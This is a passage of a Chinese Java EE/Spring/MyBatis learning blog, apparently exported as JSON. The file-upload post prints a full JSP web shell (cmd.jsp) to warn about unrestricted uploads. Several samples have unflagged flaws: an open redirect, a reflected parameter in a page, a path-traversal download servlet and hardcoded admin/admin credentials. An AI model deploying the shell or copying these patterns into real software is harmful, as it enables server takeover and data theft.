}但是上面这个代码是不执行的，finally因为在前面，调用了system.exit(1);将程序退出了，finally无法执行 finalize是java.lang.Object中的一个方法，它是在垃圾回收前，提前对特定对象进行回收，但是现在已经不推荐使用了。","categories":[],"tags":[{"name":"面试题","slug":"面试题","permalink":"http://yoursite.com/tags/%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"name":"java复习","slug":"java复习","permalink":"http://yoursite.com/tags/java%E5%A4%8D%E4%B9%A0/"},{"name":"java核心技术","slug":"java核心技术","permalink":"http://yoursite.com/tags/java%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/"}]},{"title":"exception和error区别","slug":"exception和error区别","date":"2018-07-10T10:06:41.000Z","updated":"2020-11-14T17:11:20.613Z","comments":true,"path":"2018/07/10/exception和error区别/","link":"","permalink":"http://yoursite.com/2018/07/10/exception%E5%92%8Cerror%E5%8C%BA%E5%88%AB/","excerpt":"","text":"exception和error都是继承throwable类，在java中只有throwable类型可以被throw或者被catch，它是异常处理机制的基本组成类型error是指正常情况下，不大可能出现的，绝大多数error都会导致程序（比如jvm自身）处于非正常或者不可恢复的状态。比如说OutOfmemoryErrorexception分为可检查（checked）和不可检查（unchecked）checked在程序中必须进行捕获处理，譬如IOExceptionunchecked是运行时异常，譬如说RuntimeException和NullPointerException","categories":[],"tags":[{"name":"面试题","slug":"面试题","permalink":"http://yoursite.com/tags/%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"name":"java复习","slug":"java复习","permalink":"http://yoursite.com/tags/java%E5%A4%8D%E4%B9%A0/"},{"name":"java核心技术","slug":"java核心技术","permalink":"http://yoursite.com/tags/java%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/"}]},{"title":"java.lang.ClassNotFoundException_ org.apache.jsp.WEB_002dINF.jsp.login_jsp","slug":"java.lang.ClassNotFoundException_ org.apache.jsp.WEB_002dINF.jsp.login_jsp","date":"2018-06-20T08:44:36.000Z","updated":"2020-11-14T17:11:21.089Z","comments":true,"path":"2018/06/20/java.lang.ClassNotFoundException_ org.apache.jsp.WEB_002dINF.jsp.login_jsp/","link":"","permalink":"http://yoursite.com/2018/06/20/java.lang.ClassNotFoundException_%20org.apache.jsp.WEB_002dINF.jsp.login_jsp/","excerpt":"","text":"springboot 项目中，出现这个错误，查看是否pom.xml里面的denpendency是否都已经下载成功，如果不是，你看看别人的博客","categories":[],"tags":[{"name":"springboot","slug":"springboot","permalink":"http://yoursite.com/tags/springboot/"}]},{"title":"mybatis lazyload","slug":"mybatis lazyload","date":"2018-06-15T02:16:12.000Z","updated":"2020-11-14T17:11:21.624Z","comments":true,"path":"2018/06/15/mybatis lazyload/","link":"","permalink":"http://yoursite.com/2018/06/15/mybatis%20lazyload/","excerpt":"","text":"首先pojo类dept.java package com.husky.pojo; import java.util.List; public class Dept { private int id; private String name; private List&lt;Emp&gt; emps; public int getId() { return id; } public void setId(int id) { this.id = id; } public String getName() { return name; } public void setName(String name) { this.name = name; } public List&lt;Emp&gt; getEmps() { return emps; } public void setEmp(List&lt;Emp&gt; emps) { this.emps = emps; } @Override public String toString() { return &quot;Dept{&quot; + &quot;id=&quot; + id + &quot;, name=&apos;&quot; + name + &apos;\\&apos;&apos; + &quot;, emps=&quot; + emps + &apos;}&apos;; } }emp.java package com.husky.pojo; public class Emp { private int id; private String firstName; private double salary; private Emp manager; public int getId() { return id; } public void setId(int id) { this.id = id; } public String getFirstName() { return firstName; } public void setFirstName(String firstName) { this.firstName = firstName; } public double getSalary() { return salary; } public void setSalary(double salary) { this.salary = salary; } public Emp getManager() { return manager; } public void setManager(Emp manager) { this.manager = manager; } @Override public String toString() { return &quot;Emp{&quot; + &quot;id=&quot; + id + &quot;, firstName=&apos;&quot; + firstName + &apos;\\&apos;&apos; + &quot;, salary=&quot; + salary + &quot;, manager=&quot; + manager + &apos;}&apos;; } }下面是EmpMapper.xml &lt;!--namespace=&quot;emp&quot;--&gt; &lt;select id=&quot;findByDept&quot; parameterType=&quot;int&quot; resultType=&quot;com.husky.pojo.Emp&quot;&gt; select id,first_name name,salary from s_emp where dept_id = #{id} &lt;/select&gt;DeptMapper.xml &lt;!--lazy load--&gt; &lt;resultMap id=&quot;lazyDept&quot; type=&quot;com.husky.pojo.Dept&quot;&gt; &lt;id column=&quot;id&quot; property=&quot;id&quot;/&gt; &lt;!-- 对dept中的emp信息延迟加载 在collection中的 select :表示关联的查询，此处如果的findByDept不是DeptMapper.xml中，则要加另一个mapper的namespace，如emp.findByDept column:是另外一个查询所需要的参数 --&gt; &lt;collection property=&quot;emps&quot; ofType=&quot;com.husky.pojo.Emp&quot; select=&quot;emp.findByDept&quot; column=&quot;id&quot;&gt;&lt;/collection&gt; &lt;/resultMap&gt; &lt;select id=&quot;findDeptById&quot; parameterType=&quot;int&quot; resultMap=&quot;lazyDept&quot;&gt; select id,name from s_dept where id = #{id} &lt;/select&gt;当然要开启懒加载要在mybatis 配置文件中加上lazyload的配置sqlMapConfig.xml &lt;settings&gt; &lt;!-- Globally enables or disables any caches configured in any mapper under this configuration --&gt; &lt;setting name=&quot;cacheEnabled&quot; value=&quot;true&quot;/&gt; &lt;!-- Sets the number of seconds the driver will wait for a response from the database --&gt; &lt;setting name=&quot;defaultStatementTimeout&quot; value=&quot;3000&quot;/&gt; &lt;!-- Enables automatic mapping from classic database column names A_COLUMN to camel case classic Java property names aColumn --&gt; &lt;setting name=&quot;mapUnderscoreToCamelCase&quot; value=&quot;true&quot;/&gt; &lt;!-- Allows JDBC support for generated keys. A compatible driver is required. This setting forces generated keys to be used if set to true, as some drivers deny compatibility but still work --&gt; &lt;setting name=&quot;useGeneratedKeys&quot; value=&quot;true&quot;/&gt; &lt;!--开启懒加载--&gt; &lt;setting name=&quot;lazyLoadingEnabled&quot; value=&quot;true&quot;/&gt; &lt;!--关闭懒加载的对象可能被任何懒属性全部加载--&gt; &lt;setting name=&quot;aggressiveLazyLoading&quot; value=&quot;false&quot;/&gt; &lt;!--消除equals，hashcode，toString等方法对懒加载的影响--&gt; &lt;setting name=&quot;lazyLoadTriggerMethods&quot; value=&quot;&quot;/&gt; &lt;/settings&gt;测试 package com.husky.test; import com.husky.pojo.Dept; import com.husky.pojo.Emp; import com.husky.pojo.Region; import org.apache.ibatis.io.Resources; import org.apache.ibatis.session.SqlSession; import org.apache.ibatis.session.SqlSessionFactory; import org.apache.ibatis.session.SqlSessionFactoryBuilder; import org.junit.Before; import java.io.IOException; import java.io.InputStream; public class Test { SqlSessionFactory factory; @Before public void before() throws IOException { String res = &quot;com/husky/sqlMapConfig.xml&quot;; InputStream is = Resources.getResourceAsStream(res); factory = new SqlSessionFactoryBuilder().build(is); } @org.junit.Test public void lazyTest(){ SqlSession session = factory.openSession(); Dept d = session.selectOne(&quot;findDeptById&quot;,42); System.out.println(d); System.out.println(d.getEmps()); } }输出结果 Dept{id=42, name=&apos;Operations&apos;, emps=null} [Emp{id=7, firstName=&apos;null&apos;, salary=1250.0, manager=null}, Emp{id=18, firstName=&apos;null&apos;, salary=1200.0, manager=null}, Emp{id=19, firstName=&apos;null&apos;, salary=795.0, manager=null}]","categories":[],"tags":[{"name":"mybatis","slug":"mybatis","permalink":"http://yoursite.com/tags/mybatis/"},{"name":"lazyload","slug":"lazyload","permalink":"http://yoursite.com/tags/lazyload/"}]},{"title":"springmvc 静态文件无法访问  js css img","slug":"springmvc 静态文件无法访问  js css img","date":"2018-06-14T03:43:57.000Z","updated":"2020-11-14T17:11:22.590Z","comments":true,"path":"2018/06/14/springmvc 静态文件无法访问  js css img/","link":"","permalink":"http://yoursite.com/2018/06/14/springmvc%20%E9%9D%99%E6%80%81%E6%96%87%E4%BB%B6%E6%97%A0%E6%B3%95%E8%AE%BF%E9%97%AE%20%20js%20css%20img/","excerpt":"","text":"web.xml里面配置的dispatchservlet &lt;servlet&gt; &lt;servlet-name&gt;springmvc&lt;/servlet-name&gt; &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt; &lt;init-param&gt; &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt; &lt;param-value&gt;classpath:spring.xml&lt;/param-value&gt; &lt;/init-param&gt; &lt;/servlet&gt; &lt;servlet-mapping&gt; &lt;servlet-name&gt;springmvc&lt;/servlet-name&gt; &lt;url-pattern&gt;/&lt;/url-pattern&gt; &lt;/servlet-mapping&gt;在jsp中调用jquery.js的时候，浏览器console提示，jquery.js 404 ,找不到 url-pattern有5种配置模式： （1）/xxx:完全匹配/xxx的路径 （2）/xxx/*:匹配以/xxx开头的路径，请求中必须包含xxx。 （3）/*：匹配/下的所有路径,请求可以进入到action或controller，但是转发jsp时再次被拦截，不能访问jsp界面。 （4）.xx:匹配以xx结尾的路径，所有请求必须以.xx结尾，但不会影响访问静态文件。 （5）/:默认模式，未被匹配的路径都将映射到刺servlet，对jpg，js，css等静态文件也将被拦截，不能访问。 可以用以下方式解决：1.在spring-mvc.xml里面配置 &lt;mvc:resources mapping=&quot;/js/&quot; location=&quot;/js/**&quot;/&gt; &lt;mvc:resources mapping=&quot;/css/&quot; location=&quot;/css/**&quot;/&gt; &lt;mvc:resources mapping=&quot;/img/&quot; location=&quot;/img/**&quot;/&gt;2.在web.xml里面配置 &lt;servlet-mapping&gt; &lt;servlet-name&gt;default&lt;/servlet-name&gt; &lt;url-pattern&gt;/js/*&lt;/url-pattern&gt; &lt;/servlet-mapping&gt;此处的default首先所有的请求进入tomcat，都会流经servlet，如果没有匹配到任何应用指定的servlet，那么就会流到默认的servlet。","categories":[],"tags":[]},{"title":"idea maven spring java普通项目","slug":"idea maven spring java普通项目","date":"2018-06-05T09:30:32.000Z","updated":"2020-11-14T17:11:26.145Z","comments":true,"path":"2018/06/05/idea maven spring java普通项目/","link":"","permalink":"http://yoursite.com/2018/06/05/idea%20maven%20spring%20java%E6%99%AE%E9%80%9A%E9%A1%B9%E7%9B%AE/","excerpt":"","text":"配置pom.xml下面在pom.xml里面添加 &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-context&lt;/artifactId&gt; &lt;version&gt;4.3.16.RELEASE&lt;/version&gt; &lt;/dependency&gt;具体的，可以去 http://mvnrepository.com/artifact/org.springframework/spring-context 自己选择，你需要的版本pom写好后，reimport一下 在src文件夹下新建一个resources文件夹，将他改为Resources root 在里面新建spring-config.xml 简单测试一下，成功","categories":[],"tags":[{"name":"spring","slug":"spring","permalink":"http://yoursite.com/tags/spring/"}]},{"title":"点击登录后跳转回原来界面","slug":"点击登录后跳转回原来界面","date":"2018-06-04T08:24:43.000Z","updated":"2020-11-14T17:11:26.639Z","comments":true,"path":"2018/06/04/点击登录后跳转回原来界面/","link":"","permalink":"http://yoursite.com/2018/06/04/%E7%82%B9%E5%87%BB%E7%99%BB%E5%BD%95%E5%90%8E%E8%B7%B3%E8%BD%AC%E5%9B%9E%E5%8E%9F%E6%9D%A5%E7%95%8C%E9%9D%A2/","excerpt":"","text":"具体思想，在点击登录是时候，将当前界面的地址callback通过get方式传到login界面，login界面再通过方式传递过去 some.jsp &lt;%@ page import=&quot;java.util.List&quot; %&gt; &lt;%@ page import=&quot;java.util.Collection&quot; %&gt;&lt;%-- Created by IntelliJ IDEA. User: Administrator Date: 2018/6/4 0004 Time: 上午 11:12 To change this template use File | Settings | File Templates. --%&gt; &lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;$Title$&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;a id=&quot;logina&quot; href=&quot;login.jsp?callback=&quot;&gt;login&lt;/a&gt; &lt;/body&gt; &lt;script type=&quot;text/javascript&quot;&gt; var a = document.getElementById(&quot;logina&quot;); console.log(a); a.href+=window.location.href; &lt;/script&gt; &lt;/html&gt;login.jsp &lt;%-- Created by IntelliJ IDEA. User: Administrator Date: 2018/6/4 0004 Time: 下午 1:04 To change this template use File | Settings | File Templates. --%&gt; &lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;Title&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;form method=&quot;post&quot; action=&quot;login&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;name&quot;/&gt; &lt;input type=&quot;password&quot; name=&quot;password&quot;/&gt; &lt;input type=&quot;hidden&quot; name=&quot;callback&quot; value=&quot;&lt;%=request.getParameter(&quot;callback&quot;)%&gt;&quot;/&gt; &lt;input type=&quot;submit&quot; value=&quot;login&quot;/&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt;controller package controller; import javax.servlet.ServletException; import javax.servlet.annotation.WebServlet; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.IOException; @WebServlet(name = &quot;LoginServlet&quot;,urlPatterns = {&quot;/login&quot;}) public class LoginServlet extends HttpServlet { protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { request.setCharacterEncoding(&quot;utf-8&quot;); /** * 省略对用户名和密码的操作，和数据库匹配 * * */ String callback = request.getParameter(&quot;callback&quot;); response.sendRedirect(callback); } protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { } }","categories":[],"tags":[]},{"title":"javaee 自动登录","slug":"javaee 自动登录","date":"2018-05-24T15:27:11.000Z","updated":"2020-11-14T17:11:27.194Z","comments":true,"path":"2018/05/24/javaee 自动登录/","link":"","permalink":"http://yoursite.com/2018/05/24/javaee%20%E8%87%AA%E5%8A%A8%E7%99%BB%E5%BD%95/","excerpt":"","text":"自动登录参照思想 login..jsp &lt;%-- Created by IntelliJ IDEA. User: Administrator Date: 2018/5/24 0024 Time: 下午 6:22 To change this template use File | Settings | File Templates. --%&gt; &lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;Title&lt;/title&gt; &lt;/head&gt; &lt;body onload=&quot;login()&quot;&gt; &lt;form id=&quot;form&quot; action=&quot;login&quot; method=&quot;post&quot; &gt; &lt;input id=&quot;name&quot; type=&quot;text&quot; name=&quot;name&quot; value=&quot;&quot;/&gt; &lt;input id=&quot;password&quot; type=&quot;password&quot; name=&quot;password&quot; value=&quot;&quot;/&gt; 自动登录&lt;input type=&quot;checkbox&quot; name=&quot;check&quot;/&gt; &lt;input id=&quot;token&quot; type=&quot;hidden&quot; name=&quot;token&quot;&gt; &lt;input type=&quot;submit&quot; value=&quot;login&quot;/&gt; &lt;/form&gt; &lt;script type=&quot;text/javascript&quot;&gt; function login() { var cookies = document.cookie; var name = cookies.split(&quot;;&quot;)[0].split(&quot;=&quot;)[1]; var token = cookies.split(&quot;;&quot;)[1].split(&quot;=&quot;)[1]; var checkon = cookies.split(&quot;;&quot;)[2].split(&quot;=&quot;)[1]; console.log(name +&quot; &quot;+token+&quot; &quot;+checkon); console.log(checkon); if(checkon==&quot;on&quot;){ console.log(&quot;yes&quot;); var nameInp = document.getElementById(&quot;name&quot;); nameInp.value = name; console.log(nameInp); var tokenInp = document.getElementById(&quot;token&quot;); tokenInp.value = token; document.getElementById(&quot;form&quot;).submit(); } } &lt;/script&gt; &lt;/body&gt; &lt;/html&gt;loginservlet.java package servlet; import dao.AutoLoginDao; import dao.impl.AutoLoginImpl; import util.RandomUtil; import javax.servlet.ServletException; import javax.servlet.annotation.WebServlet; import javax.servlet.http.Cookie; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.IOException; @WebServlet(name = &quot;LoginServlet&quot;,urlPatterns = {&quot;/login&quot;}) public class LoginServlet extends HttpServlet { protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { request.setCharacterEncoding(&quot;utf-8&quot;); response.setContentType(&quot;text/html;charset=utf-8&quot;); String name = request.getParameter(&quot;name&quot;); String password = request.getParameter(&quot;password&quot;); String check = request.getParameter(&quot;check&quot;); String token = request.getParameter(&quot;token&quot;); System.out.println(&quot;name: &quot;+name+&quot;password: &quot;+password+&quot;check: &quot;+check); if(name.equals(&quot;admin&quot;)&amp;&amp;password.equals(&quot;admin&quot;)){//此处，应该是判断name和password时候在数据库 Cookie cookie = new Cookie(&quot;name&quot;,name); cookie.setMaxAge(60*60); token = RandomUtil.randomString(10); Cookie cookie1 = new Cookie(&quot;token&quot;,token); cookie1.setMaxAge(60*60); AutoLoginDao ad = new AutoLoginImpl(); ad.addAutoLogin(name,token);//将数据放入数据库 Cookie cookie2 = new Cookie(&quot;check&quot;,check); cookie2.setMaxAge(60*60); response.addCookie(cookie); response.addCookie(cookie1); response.addCookie(cookie2); response.getWriter().write(&quot;success&quot;); }else if(token!=null&amp;&amp;!token.equals(&quot;&quot;)){//token存在且不是为空 AutoLoginDao ad = new AutoLoginImpl(); boolean result = ad.selectByNameAndToken(name,token);//判断token是否和数据库一样 if(result){ response.getWriter().write(&quot;success&quot;); }else{ Cookie cookie2 = new Cookie(&quot;check&quot;,&quot;notOn&quot;);//防止重复跳转 response.sendRedirect(&quot;login.jsp&quot;); } }else{ response.sendRedirect(&quot;login.jsp&quot;);//登录不成功 } } protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { doPost(request,response); } }auto_login.sql create table auto_login( id int primary key auto_increment, user_id VARCHAR(30) not null , token text not null );具体这边的token需要随机生成，所以需要用一些特别的加密算法，md5等等","categories":[],"tags":[]},{"title":"javaee上传文件下载文件","slug":"javaee上传文件下载文件","date":"2018-05-24T09:06:12.000Z","updated":"2020-11-14T17:11:28.311Z","comments":true,"path":"2018/05/24/javaee上传文件下载文件/","link":"","permalink":"http://yoursite.com/2018/05/24/javaee%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6/","excerpt":"","text":"*上传 * upload.html &lt;!DOCTYPE html&gt; &lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;Title&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;form action=&quot;upload&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;!--enctype=&quot;multipart/form-data&quot;支持二进制上传数据，application/x-www-form-urlencoded支持文本传输--&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot;/&gt; &lt;input type=&quot;file&quot; name=&quot;file2&quot;&gt; &lt;input type=&quot;submit&quot; value=&quot;submit&quot;&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt;UploadServlet.java package servlet; import javax.servlet.ServletException; import javax.servlet.annotation.MultipartConfig; import javax.servlet.annotation.WebServlet; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import javax.servlet.http.Part; import java.io.File; import java.io.IOException; import java.util.List; @WebServlet(name = &quot;UploadServlet&quot;,urlPatterns = {&quot;/upload&quot;}) @MultipartConfig //该注解主要是为了辅助 Servlet 3.0 中 HttpServletRequest 提供的对上传文件的支持 public class UploadServlet extends HttpServlet { protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { request.setCharacterEncoding(&quot;utf-8&quot;); response.setContentType(&quot;text/html;charset=utf-8&quot;); String path = request.getServletContext().getRealPath(&quot;&quot;);//获取服务器当前目录 List&lt;Part&gt; partList = (List&lt;Part&gt;)request.getParts();//获得 for(Part part: partList){ System.out.println(part.getName()); System.out.println(part.getSize()); System.out.println(part.getSubmittedFileName());//这个方法可以获取上传文件名 System.out.println(path); part.write(path+ File.separator+part.getSubmittedFileName());//提交地址 } } protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { doPost(request,response); } }安全问题上面这个上传文件直接保存在服务器当前目录，也就是你传个jsp文件也可以，上传成功，下面这个cmd.jsp就可以造成很大的破坏 &lt;%@ page import=&quot;java.util.*,java.io.*&quot;%&gt; &lt;% // // JSP_KIT // // cmd.jsp = Command Execution (unix) // // by: Unknown // modified: 27/06/2003 // %&gt; &lt;HTML&gt;&lt;BODY&gt; &lt;FORM METHOD=&quot;GET&quot; NAME=&quot;myform&quot; ACTION=&quot;cmd.jsp&quot;&gt; &lt;INPUT TYPE=&quot;text&quot; NAME=&quot;cmd&quot;&gt; &lt;INPUT TYPE=&quot;submit&quot; VALUE=&quot;Send&quot;&gt; &lt;/FORM&gt; &lt;pre&gt; &lt;% if (request.getParameter(&quot;cmd&quot;) != null) { out.println(&quot;Command: &quot; + request.getParameter(&quot;cmd&quot;) + &quot;&lt;BR&gt;&quot;); Process p = Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;)); OutputStream os = p.getOutputStream(); InputStream in = p.getInputStream(); DataInputStream dis = new DataInputStream(in); String disr = dis.readLine(); while ( disr != null ) { out.println(disr); disr = dis.readLine(); } } %&gt; &lt;/pre&gt; &lt;/BODY&gt;&lt;/HTML&gt;具体，你可以在浏览器中输入 ，，，localhost:8080/upload/cmd.jsp,然后在form表单能输入指令ipconfig，可以获得服务器的ip等等。所以，在上传文件的时候路径要改，part.write(“c:”+File.separator+part.getSubmittedFileName());,直接将文件保存在c：盘，当然，具体路径，你自便 下载download.html &lt;!DOCTYPE html&gt; &lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;Title&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;a href=&quot;download?fileName=gakki.jpg&quot;&gt;gakki.jpg&lt;/a&gt; &lt;/body&gt; &lt;/html&gt;DownloadServlet package servlet; import javax.servlet.ServletException; import javax.servlet.annotation.WebServlet; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.File; import java.io.FileInputStream; import java.io.IOException; import java.io.OutputStream; @WebServlet(name = &quot;DownloadServlet&quot;,urlPatterns = {&quot;/download&quot;}) public class DownloadServlet extends HttpServlet { protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { request.setCharacterEncoding(&quot;utf-8&quot;); response.setContentType(&quot;text/html;charset=utf-8&quot;); String fileName = request.getParameter(&quot;fileName&quot;); FileInputStream fis = new FileInputStream(&quot;c:&quot;+ File.separator+fileName); response.setHeader(&quot;Content-Disposition&quot;, &quot;attachment;filename=&quot;+fileName); OutputStream os = response.getOutputStream(); byte[] buf = new byte[1024]; int l = -1; while((l = fis.read(buf))!=-1){ os.write(buf,0,l); os.flush(); } } protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { doPost(request,response); } }","categories":[],"tags":[{"name":"上传下载","slug":"上传下载","permalink":"http://yoursite.com/tags/%E4%B8%8A%E4%BC%A0%E4%B8%8B%E8%BD%BD/"}]},{"title":"ajax jquery实现分页","slug":"ajax jquery实现分页","date":"2018-05-20T12:39:00.000Z","updated":"2020-11-14T17:11:28.814Z","comments":true,"path":"2018/05/20/ajax jquery实现分页/","link":"","permalink":"http://yoursite.com/2018/05/20/ajax%20jquery%E5%AE%9E%E7%8E%B0%E5%88%86%E9%A1%B5/","excerpt":"","text":"模仿以上代码 html js部分 &lt;body onload=&quot;loadData()&quot;&gt; &lt;h2&gt;评论区&lt;/h2&gt; &lt;table id=&quot;mytable&quot;&gt; &lt;tr&gt; &lt;th&gt;name&lt;/th&gt; &lt;th&gt;评论&lt;/th&gt; &lt;th&gt;score&lt;/th&gt; &lt;/tr&gt; &lt;/table&gt; &lt;button onclick=&quot;reducePage()&quot;&gt;上一页&lt;/button&gt; &lt;button onclick=&quot;addPage()&quot;&gt;下一页&lt;/button&gt; //跳转到指定页面，可以获取输入框的值 &lt;script&gt; var currentPage = 1; var gid = ${goods.id}; function addPage() { currentPage = currentPage + 1; loadData(); } function reducePage() { currentPage = currentPage - 1; loadData(); } function loadData() { // $(&quot;.detail&quot;).remove();//每次从api获取值时，先清除表格tr的内容 $.ajax({ url:&quot;GetCommentsController&quot;, method:&quot;get&quot;, data:&quot;currentPage=&quot;+currentPage+&quot;&amp;gid=&quot;+gid, success:function (result) { $(&quot;.detail&quot;).remove();//每次从api获取值时，先清除表格tr的内容 var results = JSON.parse(result); for(var i=0;i&lt;results.length;i++){ var id = results[i].id; var content = results[i].content; var user = results[i].user.name; var score = results[i].score; appendData(content,user,score); } } }); } function appendData(content,user,score) { var text = &apos;&lt;tr class=&quot;detail&quot;&gt;&lt;td&gt;&apos;+user+&apos;&lt;/td&gt;&lt;td&gt;&apos;+content+&apos;&lt;/td&gt;&lt;td&gt;&apos;+score+&apos;&lt;/td&gt;&lt;/tr&gt;&apos;; console.log(text); $(&apos;#mytable&apos;).append(text); }servlet部分 @WebServlet(name = &quot;GetCommentsController&quot;,urlPatterns = {&quot;/GetCommentsController&quot;}) public class GetCommentsController extends HttpServlet { protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { request.setCharacterEncoding(&quot;utf-8&quot;); response.setContentType(&quot;text/html;charset=utf-8&quot;); String gid = request.getParameter(&quot;gid&quot;); String currentPage = request.getParameter(&quot;currentPage&quot;); System.out.println(gid+&quot; &quot;+currentPage); CommentService cs = new CommentServiceImpl(); Goods goods = new Goods(); goods.setId(Integer.parseInt(gid)); Page page = new Page(); page.setNum(3); page.setCurrentPage(Integer.parseInt(currentPage)); page.setTotal(PageUtil.totalByGoods(Integer.parseInt(gid),3)); List&lt;Comment&gt; commentList= cs.getAllComments(goods,page); Gson gson = new Gson(); String str = gson.toJson(commentList); System.out.println(str); response.getWriter().write(str); } protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { doPost(request,response); } }","categories":[],"tags":[]},{"title":"filter实现用户登录后才能发文章的功能","slug":"filter实现用户登录后才能发文章的功能","date":"2018-05-14T12:03:57.000Z","updated":"2020-11-14T17:11:29.861Z","comments":true,"path":"2018/05/14/filter实现用户登录后才能发文章的功能/","link":"","permalink":"http://yoursite.com/2018/05/14/filter%E5%AE%9E%E7%8E%B0%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E5%90%8E%E6%89%8D%E8%83%BD%E5%8F%91%E6%96%87%E7%AB%A0%E7%9A%84%E5%8A%9F%E8%83%BD/","excerpt":"","text":"首先，BBS论坛是游客和用户都可以访问的，但是只有用户登录后才可以发帖如图中，当前没人在线，当我在下方发帖处输入信息，并发帖 &lt;form method=&quot;post&quot; action=&quot;WriteArticleServlet.do&quot;&gt; 标题：&lt;input type=&quot;text&quot; placeholder=&quot;请输入标题&quot; name=&quot;title&quot;&gt;&lt;br/&gt; 内容:&lt;textarea name=&quot;content&quot;&gt;&lt;/textarea&gt;&lt;br/&gt; &lt;button type=&quot;submit&quot;&gt;发帖&lt;/button&gt; &lt;/form&gt;此处是发帖处的代码 @WebServlet(name = &quot;WriteArticleServlet&quot;,urlPatterns = {&quot;/WriteArticleServlet.do&quot;}) public class WriteArticleServlet extends HttpServlet { .....此处是writerArticleServlet的代码于是，创建了一个filter package filter; import entity.User; import javax.servlet.*; import javax.servlet.annotation.WebFilter; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import javax.servlet.http.HttpSession; import java.io.IOException; @WebFilter(filterName = &quot;WriteFilter&quot;,urlPatterns = {&quot;*.do&quot;})//此处，对.do结尾的进行过滤，一定要写对这个，不然Tomcat就不断报错 public class WriteFilter implements Filter { public void destroy() { } public void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain) throws ServletException, IOException { HttpServletRequest httpServletRequest = (HttpServletRequest)req; HttpServletResponse httpServletResponse = (HttpServletResponse)resp; HttpSession session = httpServletRequest.getSession(); User user = (User)session.getAttribute(&quot;user&quot;);//获得当前的用户，如果不存在返回null if(user!=null) { System.out.println(&quot;通过filter&quot;); chain.doFilter(req, resp);关于chain.doFilter(request,response) //他的作用是将请求转发给过滤器链上下一个对象。这里的下一个指的是下一个filter，如果没有filter那就是你请求的资源。 一般filter都是一个链,web.xml 里面配置了几个就有几个。一个一个的连在一起 //request -&gt; filter1 -&gt; filter2 -&gt;filter3 -&gt; .... -&gt; request resource. }else{ System.out.println(&quot;没有通过filter&quot;); httpServletResponse.sendRedirect(&quot;login.html&quot;); } } public void init(FilterConfig config) throws ServletException { } }","categories":[],"tags":[]},{"title":"javaee mvc","slug":"javaee mvc","date":"2018-05-13T12:12:11.000Z","updated":"2020-11-14T17:11:30.725Z","comments":true,"path":"2018/05/13/javaee 